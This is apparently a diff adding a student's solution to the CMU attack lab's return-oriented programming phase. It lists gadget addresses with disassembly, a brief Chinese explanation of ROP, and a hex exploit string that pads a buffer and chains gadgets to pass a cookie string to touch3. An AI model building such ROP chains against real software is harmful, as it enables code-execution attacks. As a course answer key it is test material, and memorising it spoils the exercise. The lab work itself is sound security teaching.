@@ -1,0 +1,32 @@
+/*
+Cookie: 0x59b997fa
+Ascii : 35 39 62 39 39 37 66 61 
+401aad : 48 89 e0 90            movq %rsp, %rax
+4019c5 : 48 89 c7 90            movq %rax, %rdi
+4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+4019ab: 58 90                   popq %rax
+4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+              89 c2 90          movl %eax, %edx
+401a11: 8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+              89 ce 90 90       movl %ecx, %esi
+401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+           89 d1 38 c9          movl %edx, %ecx
+return-oriented：溢出的部分一行一个地址，然后紧接着ret会执行下一个gadget
+*/
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+f3 f3 f3 f3 f3 f3 f3 f3
+ab 19 40 00 00 00 00 00 /* popq %rax. Next line will be value of popq */
+20 00 00 00 00 00 00 00 /* Value for %rsi, popq to %rax               */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
+34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
+ad 1a 40 00 00 00 00 00 /* <- position of %rax. movq %rsp, %rax */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi */
+fa 18 40 00 00 00 00 00 /* callq <touch3< */
+35 39 62 39 39 37 66 61 /* cookie address */
